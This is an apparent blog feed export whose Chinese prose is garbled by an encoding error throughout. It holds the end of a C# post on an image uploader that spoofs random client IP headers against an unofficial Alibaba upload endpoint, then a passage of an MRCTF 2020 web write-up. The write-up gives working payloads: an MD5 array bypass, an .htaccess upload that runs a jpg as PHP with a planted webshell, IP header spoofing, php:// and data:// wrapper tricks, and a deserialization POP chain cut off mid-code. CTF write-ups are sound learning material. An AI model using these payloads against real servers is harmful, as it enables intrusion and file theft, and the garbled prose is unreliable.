ï¼‰ï¼Œæ‰€ä»¥ä¸€ç›´ä¸çŸ¥é“æ€ä¹ˆè§£å†³å¥½ã€‚å¶ç„¶çœ‹äº†ä¸€ä¸‹æ–¹æ³•çš„é‡è½½ï¼Œå‘ç°å¯ä»¥ä¸Šä¼  Streamã€‚äºæ˜¯å°±æœ‰äº†å…ˆæŠŠæ–‡ä»¶è¯»å…¥æˆ Stream ä¸Šä¼ ä¹‹åå† Dispose çš„æ€è·¯ã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">FileStream uploadImg = <span class="keyword">new</span> FileStream(args[i],FileMode.Open,FileAccess.Read, FileShare.Read);</span><br><span class="line"><span class="built_in">byte</span>[] bytesImg = <span class="keyword">new</span> <span class="built_in">byte</span>[uploadImg.Length];</span><br><span class="line">uploadImg.Read(bytesImg, <span class="number">0</span>, bytesImg.Length);</span><br><span class="line">uploadImg.Close();</span><br><span class="line">Stream uploadImgStream = <span class="keyword">new</span> MemoryStream(bytesImg);</span><br><span class="line">                </span><br><span class="line"><span class="keyword">var</span> uploadRespose = uploadUrl.WithHeaders(<span class="keyword">new</span> &#123;</span><br><span class="line">                    User_Agent = userAgents[randomNum.Next(<span class="number">4</span>)],</span><br><span class="line">                    Client_IP = randomNum.Next(<span class="number">192</span>) + <span class="string">&quot;.&quot;</span> + randomNum.Next(<span class="number">255</span>) + <span class="string">&quot;.&quot;</span> + randomNum.Next(<span class="number">255</span>) + <span class="string">&quot;.&quot;</span> + randomNum.Next(<span class="number">255</span>)</span><br><span class="line">                &#125;).PostMultipartAsync(data =&gt; </span><br><span class="line">                    data.AddString(<span class="string">&quot;file&quot;</span>,<span class="string">&quot;multipart&quot;</span>)</span><br><span class="line">                        .AddFile(<span class="string">&quot;Filedata&quot;</span>,uploadImgStream,WebUtility.UrlEncode(args[i]))</span><br><span class="line">                ).Result;</span><br><span class="line">                </span><br><span class="line">uploadImgStream.Dispose();</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¹‹åï¼Œæ— æ³•ä¸Šä¼ å«æœ‰ä¸­æ–‡å­—ç¬¦ä½œæ–‡ä»¶åçš„æ–‡ä»¶çš„é—®é¢˜è¿åˆƒè€Œè§£ã€‚</p><h4 id="å¸¦åè®®çš„æ–‡ä»¶è·¯å¾„å¯¼è‡´ä¸Šä¼ å¤±è´¥"><a href="#å¸¦åè®®çš„æ–‡ä»¶è·¯å¾„å¯¼è‡´ä¸Šä¼ å¤±è´¥" class="headerlink" title="å¸¦åè®®çš„æ–‡ä»¶è·¯å¾„å¯¼è‡´ä¸Šä¼ å¤±è´¥"></a>å¸¦åè®®çš„æ–‡ä»¶è·¯å¾„å¯¼è‡´ä¸Šä¼ å¤±è´¥</h4><p>Typora æ”¯æŒä½¿ç”¨ <code>file:///</code> åè®®æ¥æ’å…¥å›¾ç‰‡ï¼Œä½†æ˜¯åœ¨è°ƒç”¨çš„æ—¶å€™å´åªä¼šå»æ‰ <code>file://</code> å¯¼è‡´ä¸€ä¸ª <code>/</code> è¢«ä¿ç•™åœ¨æ–‡ä»¶è·¯å¾„å‚æ•°ä¸­ï¼Œå¯¼è‡´æ–‡ä»¶æ— æ³•è¢«æ­£å¸¸è¯»å–è€ŒæŠ¥é”™ã€‚åœ¨å°è¯•è¿‡ä¹‹åå‘ç°ï¼Œä»¥ <code>/</code> å¼€å¤´çš„æ–‡ä»¶è·¯å¾„æ²¡æœ‰åŠæ³•æˆåŠŸåœ°æ’å…¥ä¸€å¼ å›¾ç‰‡ï¼Œæ‰€ä»¥è¿™æ³¢åˆšå¥½åªéœ€è¦åœ¨å°è¯•åœ¨è¯»å–æ–‡ä»¶ä¹‹å‰è¿‡æ»¤ä¸€ä¸ªå­—ç¬¦ <code>/</code>ã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;/&#x27;</span> == args[i][<span class="number">0</span>])&#123;</span><br><span class="line">args[i] = args[i].Substring(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œå‘ç°å³ä½¿æ˜¯åœ¨çº¿å¼•ç”¨çš„å›¾ç‰‡ä¹Ÿæœ‰å¯èƒ½è¢«è°ƒç”¨ä¸Šä¼ ï¼Œæ‰€ä»¥æ ¹æ®å¯ä»¥å¼•ç”¨çš„å‡ ç§åè®®åˆ¤æ–­ä¸€ä¸‹ç›´æ¥è¿”å›åŸæœ¬çš„åœ°å€ä»¥é¿å…å‡ºé”™ã€‚</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (args[i].Contains(<span class="string">&quot;http://&quot;</span>) || args[i].Contains(<span class="string">&quot;https://&quot;</span>) || args[i].Contains(<span class="string">&quot;ftp://&quot;</span>))&#123;</span><br><span class="line">fetchedUrl[i] = args[i];</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨åŸå§‹æ¥å£çš„å†å¼€å‘">ä½¿ç”¨åŸå§‹æ¥å£çš„å†å¼€å‘</h3><p>çœŸçš„ä¸å¾—ä¸è¯´ï¼ŒåŸæ¥çš„æ¥å£çœŸçš„ï¼Œå„ç§å¥‡å¥‡æ€ªæ€ªçš„é—®é¢˜ã€‚è¿™å›ç»ˆäºæ‰¾åˆ°äº†åŸå§‹çš„æ¥å£ <a href="https://github.com/iAJue/Alibaba_pic/blob/master/update.php">æ¥æº</a>ï¼Œå…´å¥‹ä¹‹ä½™å¼€äº†ä¸ªæ–°çš„ solution ä¿®è®¢ä¸€æ³¢åŸæ¥çš„ä»£ç ï¼Œåœ¨è¿™é‡Œåˆ†æä¸€äºŒã€‚</p><p>æ¥å£çš„åœ°å€æ˜¯ <code>https://kfupload.alibaba.com/mupload</code>ï¼Œä¸»è¦æœ‰è¿™ä¹ˆå‡ ä¸ªå‚æ•°ã€‚</p><table><thead><tr><th align="left">å‚æ•°åç§°</th><th align="left">å¿…å¡«</th><th align="left">ç±»å‹</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="left">scene</td><td align="left">æ˜¯</td><td align="left">string</td><td align="left">å›ºå®šå€¼â€œaeMessageCenterV2ImageRuleâ€</td></tr><tr><td align="left">name</td><td align="left">æ˜¯</td><td align="left">string</td><td align="left">æ–‡ä»¶å</td></tr><tr><td align="left">file</td><td align="left">æ˜¯</td><td align="left">stream</td><td align="left">æ–‡ä»¶æµ</td></tr></tbody></table><p>é™¤æ­¤ä¹‹å¤–ï¼Œå¿…é¡»æŒ‡å®š <code>mediaType</code> ä¸”å¤§æ¦‚åªæ”¯æŒ png/jpg/gif ä¸‰ç§ï¼Œä¸” Header ä¸­çš„ <code>User-Agent</code> é¡»ä¸º <code>iAliexpress/6.22.1 (iPhone; iOS 12.1.2; Scale/2.00)</code>ã€‚å…¶ä»–éƒ¨åˆ†å¯ä»¥ä¾ç…§å‰æ–‡æ‰€è¿°æ„é€  POST è¯·æ±‚ã€‚</p><hr><a class="button is-light is-small" href="https://cdn.jsdelivr.net/gh/LemonPrefect/sDelivr@382637d801f6034fc18cf7160225ba7dda310fab/source/PicAliCdnForTypora_0.1.5.3.cs"><span>Download Source</span></a>]]></content>
      
      
      <categories>
          
          <category> Daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSharp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MRCTF 2020</title>
      <link href="/zh-CN/posts/9c2f22e.html"/>
      <url>/zh-CN/posts/9c2f22e.html</url>
      
        <content type="html"><![CDATA[<p>è¿™æ³¢æ¯”èµ›ç»ˆäºå†™ä¸Šäº†å‡ é¢˜ Web çš„é¢˜ï¼Œæ„Ÿè§‰æŒºå¼€å¿ƒäº†ï¼Œè™½ç„¶è¿‡ç¨‹æœ‰ç‚¹æ›²æŠ˜ï¼ˆè¯´åˆ°åº•è¿˜æ˜¯æˆ‘èœ ä¸è¿‡å­¦åˆ°äº†ä¸€äº›ä¸œè¥¿ï¼Œä¹Ÿä½¿è‡ªå·±çš„æ€è·¯æ›´æ¸…æ™°äº†ä¸€äº›ã€‚</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>å¾ˆå¼€å¿ƒçš„æ˜¯è¿™æ¬¡æŠŠæœ‰æ€è·¯çš„ Web é¢˜ç›®éƒ½å†™å‡ºæ¥äº†ï¼Œè™½ç„¶ Typecho é‚£é¢˜ä¹Ÿåº”è¯¥èƒ½å†™å‡ºæ¥çš„ï¼Œå¯æƒœçš„æ˜¯è¿˜æ²¡æ‰¾åˆ°åˆ‡å…¥ç‚¹ï¼Œæ€è·¯å‡ºäº†é—®é¢˜ã€‚è‡³äº WASM é‚£é¢˜ï¼Œå®Œå…¨éƒ½æ²¡æ¥è§¦è¿‡ï¼Œæ‰€ä»¥è‡ªç„¶ä¸çŸ¥é“æ€ä¹ˆä¸‹æ‰‹æ‰‹ã€‚è¿™æ³¢æ„Ÿè§‰ Misc çš„é¢˜ç›®ç”¨äº†å¾ˆå¤šæ–°çš„ä¸œè¥¿ï¼Œä¹Ÿå……åˆ†åœ°è·Ÿå£°æ³¢æ–—æ™ºæ–—å‹‡äº†ï¼Œè™½ç„¶æœ€åæ²¡å®Œå…¨å†™å‡ºæ¥ï¼Œä¹Ÿå­¦äº†ä¸å°‘ä¸œè¥¿ã€‚è‡³äº Crypto å˜›ï¼Œè®¤çœŸå†™äº†çš„é¢˜é‡Œå€’æ˜¯æ²¡å•¥æ–°å¥‡çš„ã€‚</p><h2 id="Reflection"><a href="#Reflection" class="headerlink" title="Reflection"></a>Reflection</h2><p>è™½ç„¶è¿™æ¬¡æ²¡æœ‰å› ä¸ºä¸€é“é¢˜è€Œä¸å»çœ‹å…¶ä»–çš„ï¼Œä½†æ˜¯å‡ºç°äº†æ–°çš„é—®é¢˜ï¼Œä¸€ä¸ªå•è¯çš„æ‹¼å†™æµªè´¹äº†å¤§é‡çš„æ—¶é—´å»æ£€æŸ¥ï¼Œåº”è¯¥æ›´åŠ ç»†å¿ƒä¸€ç‚¹çš„ã€‚å¦å¤–ä¸€ç‚¹å°±æ˜¯ç†Ÿæ‚‰çš„ä¸œè¥¿çœŸçš„å¤ªå°‘äº†ï¼Œä¼šçš„ä¸œè¥¿ä¹Ÿå¾ˆå°‘QAQ</p><h2 id="Write-Up"><a href="#Write-Up" class="headerlink" title="Write Up"></a>Write Up</h2><h3 id="ez-bypass"><a href="#ez-bypass" class="headerlink" title="ez_bypass"></a>ez_bypass</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">MD5</span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">is_numberic</span><span style="padding: 0.25rem 0.375rem;background-color: #641790;color: #fff;font-size: 0.75rem;margin-right: 5px;">POST &amp; GET Trick</span></p><p>è¿™é¢˜æ„Ÿè§‰æ˜¯ç›´ç™½çš„ä»£ç å®¡è®¡ï¼Œä¸€ä¸Šæ¥å°±ç»™äº†æ®µä»£ç ã€‚ç¨å¾®çœ‹äº†ä¸€ä¸‹ä¹‹åå‘ç°ä¸¤ä¸ªç‚¹ï¼ŒMD5çš„ <code>if (md5($id) === md5($gg) &amp;&amp; $id !== $gg)</code> å¯ä»¥ç®€å•åœ°ç”¨æ•°ç»„ç»•è¿‡ã€‚<code>is_numberic</code> å¯ä»¥åŠ ä¸ª <code>%0</code> æ¥ç»•è¿‡ã€‚å› æ­¤ï¼Œç›´æ¥ä¼ ä¸¤ä¸ª GET å‚æ•° <code>id[]=1&amp;gg[]=2</code> åŠ ä¸Šä¸€ä¸ª POST å‚æ•° <code>passwd=1234567%0</code> å³å¯æ‹¿åˆ° flagã€‚</p><h3 id="ä½ ä¼ ä½ ğŸå‘¢"><a href="#ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="ä½ ä¼ ä½ ğŸå‘¢"></a>ä½ ä¼ ä½ ğŸå‘¢</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Apache Â· htaccess</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Upload</span></p><p>è¿™é¢˜ä¸€å¼€å§‹æˆ‘æ²¡æ³¨æ„åˆ°ç”¨çš„ Apache ç„¶åç–¯ç‹‚å°è¯•å„ç§æ”¹åŒ…ï¼Œç»“æœéƒ½å¤±è´¥äº†ã€‚å…¶å®è¦å…ˆä¸Šä¼ ä¸ª .htaccessï¼Œè¿™æ˜¯ Apache ç‹¬æœ‰çš„æœºåˆ¶ã€‚ï¼ˆå½“ç„¶ nginx ä¹Ÿå¯ä»¥ç”¨ä¸ä¸€æ ·çš„æ–¹æ³•å®ç°ï¼Œç”šè‡³ä½¿ nginx æ”¯æŒ .htaccessï¼‰å› æ­¤ï¼Œå†™ä¸ª .htaccess ä½¿ jpg æ–‡ä»¶è§£æä¸º php ä»è€Œæ‰§è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;crack.jpg&quot;&gt;</span><br><span class="line">SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¦å…ˆæ‹¦æˆªè¿™ä¸ªæ•°æ®åŒ…ç„¶åä¿®æ”¹ <code>Content-Type</code> æ‰èƒ½æˆåŠŸä¸Šä¼ ï¼Œä¹Ÿå¯ä»¥å…ˆé€‰ä¸€å¼ å›¾ç‰‡ï¼Œç„¶åä¿®æ”¹ <code>filename</code> å’Œå†…å®¹ï¼ˆæˆ‘å°±æ˜¯ç”¨çš„è¿™ä¸ªå¥—è·¯ï¼‰ã€‚å®Œæˆä¹‹åå†å†™ä¸€æ®µä¸€å¥è¯æœ¨é©¬ï¼Œè®°äº‹æœ¬å­˜èµ·æ¥æ‹“å±•åæ”¹æˆ <code>.jpg</code> å°±å¥½ã€‚ç„¶åä¸Šä¼ ä¹‹åå°è¯•è®¿é—®ä¸€ä¸‹ï¼Œæ²¡é—®é¢˜ä¹‹åç›´æ¥æ‹¿èœåˆ€è¿ä¸Šå»æ ¹ç›®å½•æ‰¾ flagã€‚ï¼ˆå…¶å®æ˜¯å› ä¸ºè¯•äº†å‡ æ¬¡ä¹‹åå‘ç° <code>system()</code> å•¥çš„éƒ½æ²¡ç»™ï¼Œå…¶å®è¿˜å¯ä»¥ç”¨ <code>include()</code> å•¥çš„ï¼Œä½†æ˜¯å½“æ—¶æƒ³ç€ï¼Œä¸å¦‚ç›´æ¥ä¸Šèœåˆ€ï¼‰</p><h3 id="å¥—å¨ƒ"><a href="#å¥—å¨ƒ" class="headerlink" title="å¥—å¨ƒ"></a>å¥—å¨ƒ</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Regexp</span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Char</span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Headers</span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Strings Â· Request</span><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">JSFuck</span></p><p>ä¸Šæ¥çœ‹ä¸€æ‰‹é¡µé¢æºç ï¼Œäºæ˜¯æ‰¾åˆ°äº†ç¬¬ä¸€æ­¥ã€‚è¦æ±‚å¤§æ¦‚æ˜¯è¦ <code>b_u_p_t</code> ä½†æ˜¯ä¸ç»™ <code>_</code>ï¼ŒåŠ ä¸€ä¸ªç®€å•çš„æ­£åˆ™ç»•è¿‡ã€‚äºæ˜¯æ„é€ ä¸€æ³¢ <code>...ï¼Ÿb.u.p.t=23333%0a</code> æˆåŠŸæ‹¿åˆ°ä¸‹ä¸€æ­¥çº¿ç´¢ <code>FLAG is in secrettw.php</code>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®¿é—® <code>secrettw.php</code> ä¹‹åå‘ç°é¡µé¢æºç ä¸­æœ‰ä¸€æ®µ JSFuckï¼Œä¸¢åˆ° Console é‡Œé¢æ‰§è¡Œä¸€ä¸‹ï¼Œæç¤º <code>post me Merak</code>ã€‚äºæ˜¯ç…§ç€å°è¯•äº†ä¸€ä¸‹ï¼Œæ‹¿åˆ°ä¸€æ®µä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = base64_decode(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= chr ( ord (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = getIp();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>é¦–å…ˆç…§ç€ä»£ç ç»™çš„è¦æ±‚æ„é€  GET è¯·æ±‚ï¼Œå› ä¸ºæœ‰ä¸ª <code>file_get_contents()</code> å‡½æ•°ï¼Œæ‰€ä»¥æ„é€  <code>$_GET[&#39;2333&#39;]</code> æœ‰ä¸¤ç§æ–¹æ³•ï¼Œ<code>php://input</code> + POST æˆ–è€…ç›´æ¥ç”¨ <code>data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=</code> æ¥æ„é€ ã€‚è§‚å¯Ÿåˆ° <code>$_GET[&#39;file&#39;]</code> è¿™ä¸ªæ–‡ä»¶ä¼šé¦–å…ˆè¢« <code>change()</code> ç„¶åå†è¾“å‡ºæ–‡ä»¶å†…å®¹ï¼Œæ‰€ä»¥éœ€è¦å…ˆæŠŠ flag.php å€’ç€ <code>change()</code> ä¸€æ¬¡ï¼Œè¿™æ ·ä¹‹åå°±èƒ½è¾“å‡º flag.php ä»è€Œæ‹¿åˆ° flagã€‚äºæ˜¯å†™ä¸€æ³¢ <code>RecChange()</code>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RecChange</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$re</span> .= chr ( ord (<span class="variable">$v</span>[<span class="variable">$i</span>]) - <span class="variable">$i</span>*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$re</span> = base64_encode(<span class="variable">$re</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°† flag.php <code>RecChange()</code> ä¹‹åæ‹¼æ¥åˆ° payload ä¸­ã€‚åœ¨çœ‹ä»£ç ï¼Œè¦æ±‚ <code>$ip === 127.0.0.1</code>ï¼Œäºæ˜¯ç”¨ <code>Client-IP: 127.0.0.1</code> è¿™ä¸ª header è¾¾æˆã€‚äºæ˜¯ payload æ„é€ å®Œæˆï¼Œå¾—åˆ° <code>.../secrettw.php?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;file=ZmpdYSZmXGI=</code>ã€‚æœ€åï¼Œæ ¹æ®ä»£ç ï¼Œå»é™¤æ‰æœ€å¼€å§‹çš„ POST å‚æ•°ï¼Œè¯·æ±‚ä¹‹åæŸ¥çœ‹ç½‘é¡µæºç å³å¾— flagã€‚</p><h3 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Headers</span></p><p>è¿™é¢˜ä¸€å¼€å§‹ç»™äº†ä¸ªå¾ˆæœ‰æ¢—çš„ç½‘é¡µï¼ˆäº‹å®è¯æ˜è¿™é¢˜éƒ½å¾ˆæœ‰æ¢—ï¼‰ï¼Œæ‰¾äº†æ‰¾ç½‘é¡µæºç ï¼Œå‘ç°ä¸€ä¸ª flag.phpã€‚ç›´æ¥è®¿é—®ä¹‹ååˆæ˜¯ä¸€ä¸ªå¾ˆæœ‰æ¢—çš„é¡µé¢ï¼Œå…³é”®è¯æ˜¯ IPã€‚äºæ˜¯æœæ–­è¯•ä¸€æ‰‹ <code>X-Forwarded-For: 127.0.0.1</code>ï¼Œè®¿é—®åæˆåŠŸåœ¨ç½‘é¡µæºç ä¸­æ‰¾åˆ° flagã€‚</p><h3 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">PHP ä¼ªåè®®</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Unserialize</span></p><p>è¿™é¢˜ä¸€å¼€å§‹å°±ç»™äº†ä¸€æ®µæºç ï¼Œä»”ç»†æŸ¥çœ‹ä¹‹åçŸ¥é“å°±æ˜¯ååºåˆ—åŒ–çš„è€ƒç‚¹ã€‚å¾ˆæ˜æ˜¾ï¼Œ<code>include()</code> å°±æ˜¯å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹ï¼Œäºæ˜¯ä¸€è·¯å¾€ä¸‹æ‰¾ï¼Œ<code>__invoke()</code>ï¼Œè¿™é‡Œè¦æ±‚ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ã€‚è¿™ç‚¹ä½¿ç”¨ <code>__get()</code> å¯ä»¥å®ç°ï¼Œè€Œè¿™åˆè¦æ±‚è·å–ä¸€ä¸ªç±»ä¸­ä¸å¯è¾¾çš„å±æ€§ã€‚åœ¨ <code>__wakeup()</code> ä¸­æœ‰ä¸€ä¸ª <code>$this-&gt;source</code> çš„å‚æ•°ï¼Œä½¿å¾— <code>source</code> è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²è€Œè§¦å‘ <code>__toString()</code>ã€‚è€Œæ°å¥½ <code>__toString()</code> å¯ä»¥è§¦å‘ <code>__get()</code>ã€‚è¿™æ ·ä¸€ç³»åˆ—çš„è§¦å‘å°±å®Œæˆäº†ï¼Œå› ä¸ºçŸ¥é“ flag åœ¨ flag.php ä¸­ï¼Œå› æ­¤è¦åœ¨ <code>include()</code> ä¸­ä½¿ç”¨ php ä¼ªåè®®æ¥åŒ…å«è¿™ä¸ªæ–‡ä»¶ã€‚äºæ˜¯ç¨åŠ ä¿®æ”¹ä»£ç ç„¶åå¾—åˆ°åºåˆ—åŒ–çš„ç»“æœã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span> = 